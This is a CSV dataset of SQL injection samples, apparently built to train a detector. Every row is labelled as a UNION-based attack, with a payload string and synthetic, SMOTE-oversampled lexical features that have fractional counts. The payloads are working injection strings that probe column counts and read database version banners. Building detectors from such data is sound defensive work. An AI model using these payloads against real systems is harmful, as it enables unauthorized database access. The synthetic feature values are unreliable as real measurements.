id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000430,attack,union," select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000164,0.2518728274414576,89.11579769952307,32.18941610333847,4.059232472398315,42.0,4.115797699523075,29.11579769952308,13.884202300476925,0.4713029334107404,0.046172634763977705,0.3267100951275137,0.15581433669776817,3.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,0.9999999999999996,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000431,attack,union,"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",nearest_attack_euclidean,R000710,0.41470411673487795,73.0,19.869871104332045,3.607511556873745,14.0,44.0,4.0,11.0,0.19178082191780818,0.6027397260273972,0.0547945205479452,0.1506849315068493,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000583,0.5307261187676672,70.22693535701237,28.742311785670786,4.276607277316635,29.0,18.969247142683148,15.0,7.257688214329213,0.4130942159582936,0.26973443247519807,0.21366942204739325,0.10350192951911508,1.5153764286584264,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.7423117856707866,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000433,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000122,0.021300331442601794,72.97523994176676,32.0,4.409734366740216,44.0,2.0,16.0,10.975239941766764,0.6029470020095627,0.027406681909525554,0.21925345527620466,0.15039286080470687,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.975239941766764,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000434,attack,union,"-7409""   )    )    union all select 3145,3145,3145--",nearest_attack_euclidean,R000284,0.2656403322554458,53.31076811253814,21.475692754984742,3.8791243904220396,14.0,17.048614490030513,14.0,8.262153622507629,0.2630395568233691,0.3190133818086965,0.2630395568233691,0.1549075045445653,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.262153622507628,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,union,"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",nearest_attack_euclidean,R000427,0.19240183993341195,65.67996542230077,20.0,3.670358315578267,14.0,22.943972337840613,18.0,10.735993084460153,0.2134040645372627,0.34880283497835884,0.27437665440505205,0.1634164460793264,0.0,1.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.735993084460153,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000436,attack,union,"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000667,0.23393622464787744,97.48291482849177,26.464388643798905,3.9409025624435965,59.78633186279343,9.0,15.0,13.696582965698356,0.6125696905991168,0.09268531783560158,0.15447552972600267,0.14026946183927896,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.696582965698356,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000437,attack,union,"-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",nearest_attack_euclidean,R000443,0.18954770381969144,102.31929091224069,27.0,3.755726574297923,25.0,48.31929091224069,16.0,13.0,0.24435976019182232,0.4721829179856638,0.15639024652276629,0.1270670752997476,0.9201772719398287,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.079822728060172,2.0,0.9201772719398288,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000438,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000725,0.003907372846297634,70.0,19.009345900050384,3.6450612223405283,14.0,40.0,4.0,12.0,0.2,0.5714285714285714,0.057142857142857134,0.17142857142857143,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000439,attack,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000103,0.23284831097441122,87.0,32.50111764768014,4.039363851182889,42.0,4.083147058719977,29.0,11.916852941280023,0.4827586206896552,0.04693272481287325,0.3333333333333333,0.1369753211641382,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,0.9999999999999996,6.0,0.0,0.0,1.0,0.08314705871997702,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000440,attack,union," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000077,0.0028978076749126874,76.0,33.0,4.439993102099514,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.995531746772112,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000441,attack,union,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",nearest_attack_euclidean,R000681,0.777897997882219,78.87430389629716,20.44652801481469,3.7200956459843564,14.0,40.0,11.320831911111856,13.55347198518531,0.17784711308159992,0.5081346088045713,0.14212487189642473,0.1718934062174041,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.5534719851853096,0.0,0.0,8.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000442,attack,union,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",nearest_attack_euclidean,R000200,0.12900399645123006,69.03055008969609,23.0,3.8580720677858995,14.0,39.224440071756874,4.0,11.806110017939218,0.20387779964121563,0.5669968004100392,0.05825079989749016,0.17087460005125493,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,7.806110017939218,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000443,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000528,0.15355310122661403,39.73123230383612,21.853753539232777,4.2100739039751005,14.0,16.584985843068893,4.0,5.146246460767223,0.3530085942577473,0.41673352623444576,0.10085959835935639,0.12939828114845053,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1462464607672236,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000444,attack,union," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000127,0.1411385426876423,86.56842681331041,27.0,3.8137666620525073,42.0,4.928071135551736,28.712284542206937,10.928071135551734,0.48533078953327136,0.056889464272236234,0.3315573119889317,0.12622243420556073,0.0,1.0,2.0,0.0,1.0,1.9280711355517344,0.0,2.0,0.0,0.0,0.9999999999999996,4.928071135551734,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000445,attack,union,"-2857%'   )    )     )   union all select 7167,7167,7167,7167,7167,7167,7167,7167#",nearest_attack_euclidean,R000462,0.5664464749383762,80.21177092066299,23.0,3.6802160107851494,14.0,36.0,16.569416736530393,13.642354184132598,0.17469673853511533,0.44922018480458226,0.20603108898060793,0.17005198767969454,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.642354184132598,1.0,0.0,7.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000446,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000134,0.3934921779196833,97.18212362285746,25.182123622857468,4.0316802302136425,63.0,4.0,23.0,7.182123622857468,0.6482775312181759,0.041160478172582615,0.2366727494923499,0.07388924111689166,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.18212362285746744,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000447,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000070,0.9715902864072324,100.73309353252868,26.0,4.040331980819064,62.0,5.266906467471323,24.46618706505736,9.0,0.6154998218795269,0.05230614708435247,0.24284728269876993,0.08934674833735068,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.9999999999999996,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.2669064674713212,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000448,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,0.2828945417502411,79.30704192290031,26.307041922900304,3.8748118407757404,40.0,3.153520961450152,24.846479038549848,11.307041922900304,0.5044098020134378,0.039726055662738124,0.3133608057466683,0.14250333657715591,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.307041922900304,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000449,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000294,0.15154526350040987,62.507000923370356,21.550700092337035,3.8453652921842396,14.0,24.405600738696283,14.0,10.10140018467407,0.2254260243709911,0.38779241257875907,0.2254260243709911,0.16135553867925867,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.101400184674071,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000450,attack,union,"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",nearest_attack_euclidean,R000313,0.2276554444717574,92.1711806425717,21.16576387148566,3.525132350938527,14.0,44.0,17.336944514057365,16.83423612851434,0.15195545833382162,0.47757429762058223,0.18783658214089002,0.1826336619047061,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.8342361285143407,1.0,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000451,attack,union,"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",nearest_attack_euclidean,R000395,0.874645769040332,97.56050068634343,27.0,3.9890499520580085,25.0,45.24840054907474,16.0,11.312100137268684,0.2577221110140384,0.4618685903495816,0.16494215104898458,0.1154671475873954,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.3121001372686845,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000452,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000600,1.1846646105222407,71.0,22.0,3.8653056813474707,14.0,38.165599560171415,5.8344004398285865,13.0,0.19718309859154928,0.5375436557770622,0.08217465408209276,0.18309859154929578,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.4586001099571466,1.0,0.0,7.541399890042854,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.4586001099571465,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000453,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000039,0.13536802128565367,79.83655787586821,28.40860531032947,4.044596690192169,40.0,2.918278937934108,23.0,13.918278937934106,0.5010477059239217,0.03653087202037242,0.288102430906255,0.17431899114945087,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.918278937934106,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000454,attack,union," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000123,0.0821569678577122,81.0,26.869788299015212,3.934536191567845,44.0,2.8697882990152124,24.0,10.130211700984788,0.5432098765432098,0.0354294851730273,0.2962962962962963,0.1250643419874665,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000455,attack,union,"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",nearest_attack_euclidean,R000666,0.06384879979521096,68.52425422284641,18.0,3.401337985018394,14.0,39.619403378277134,4.0,10.904850844569284,0.20440680273554127,0.578072614172841,0.058401943638726084,0.15911863945289173,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.9048508445692836,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000456,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000190,0.4901090065707543,72.74947270320855,25.099789081283422,4.157954715595289,27.0,26.199578162566844,11.0,8.549894540641711,0.37157414038349884,0.3596158336195569,0.15138205719327733,0.11742796880366692,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.549894540641711,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000457,attack,union," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",nearest_attack_euclidean,R000156,0.2764577667188169,86.55117468206095,26.0,3.8053911932678934,45.17209981832053,3.4139500908397302,28.172099818320536,9.793024954580135,0.5218561656337548,0.0398111790050103,0.32521895598098205,0.11311369938025287,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.793024954580134,0.0,0.0,0.9999999999999996,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000458,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,0.36733768459157573,78.52811724186482,23.0,3.9624172614655593,27.0,30.022493793491854,11.0,10.505623448372964,0.3441749243777859,0.3818912029780971,0.14021941363539425,0.1337144590087227,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.505623448372963,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000459,attack,union,"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",nearest_attack_euclidean,R000260,0.44222175745528297,101.55022489975987,27.489955020048026,3.8436366407778713,25.0,42.0401799198079,22.0,12.510044979951974,0.24664938395110508,0.41325376596466723,0.21705145787697247,0.12304539220725522,1.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,6.510044979951974,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000460,attack,union,"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000216,0.1467248115034043,90.97708008515414,26.804583982969174,4.052114460705966,53.781664068123305,9.0,15.0,13.195416017030826,0.5910601779670093,0.0989714946472062,0.16495249107867693,0.14501583630710768,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.195416017030827,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000461,attack,union,"1'+  (  select 'bztp' where 2541  =  2541 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000580,0.48047699670292954,108.61021094360586,26.40437611868823,3.8431401357512494,68.20583482491764,9.0,15.0,16.40437611868823,0.6280262379198708,0.08292216253376411,0.13820360422294015,0.15084799532342502,2.60291741245882,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.801458706229411,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000462,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000031,0.026199441099682155,77.11321334632844,27.0,3.943153326091036,40.0,3.0,23.11321334632844,11.0,0.5187265178399704,0.0389044888379978,0.29971920091603993,0.14264979240599185,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
